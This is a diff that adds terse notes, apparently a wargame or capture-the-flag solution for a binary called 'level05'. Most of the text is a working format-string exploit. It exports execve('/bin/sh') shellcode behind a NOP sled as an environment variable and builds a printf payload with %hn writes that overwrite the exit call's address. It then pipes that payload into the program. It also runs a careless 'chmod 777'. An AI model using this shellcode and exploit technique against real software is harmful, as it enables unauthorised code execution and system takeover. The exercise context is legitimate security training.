@@ -1,0 +1,25 @@
+simply .lower() what we put in until a size of length about 70
+
+so we can't overflow
+
+but unsecured printf later -> format string attack
+
+exit call that we know the address of
+
+we can put a shell code
+export SHELLCODE=`python -c 'print(1000 * "\x90" + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")'`
+
+get its value w/ gdb
+
+we can modify the 10-th register, put the address of exit_call and modify its value with our shellcode
+too big of a value even for printf
+
+lets seperate it using shorts(https://stackoverflow.com/questions/3257684/why-is-hd-necessary-in-scanf)
+
+address is ffffd70e -> d70e ffff
+first - 8 because of the two address, second - d70e // in decimal of course
+chmod 777 . && chmod 777 payload && chmod 777 payload
+python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55046d" + "%10$hn" + "%10481d" + "%11$hn")' > payload
+cat payload - | ./level05
+
+// each sub address has its value %h means short (half the bytes)
